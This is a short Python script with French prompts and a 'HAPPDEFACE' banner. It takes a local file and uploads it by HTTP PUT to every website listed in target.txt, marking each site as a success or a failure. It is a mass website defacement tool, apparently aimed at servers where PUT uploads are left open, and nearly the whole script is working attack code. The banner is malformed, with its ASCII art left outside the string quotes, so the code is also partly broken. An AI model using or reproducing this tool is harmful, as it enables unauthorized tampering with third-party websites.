#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit(" fait apt install requests...")

banner = """

 
""" 
BIENVENUE
 _   _    _    ____  ____  _____ _____ _    ____ _____
| | | |  / \  |  _ \|  _ \| ____|  ___/ \  / ___| ____|
| |_| | / _ \ | |_) | | | |  _| | |_ / _ \| |   |  _|
|  _  |/ ___ \|  __/| |_| | |___|  _/ ___ \ |___| |___
|_| |_/_/   \_\_|   |____/|_____|_|/_/   \_\____|_____|

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" RATÉ!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" RÉUSSITE"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("ENTRE LE NOM DU FICHIER a upload sur les sites: ")
         if not os.path.isfile(a):
            print("fichier '%s' non trouvé"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
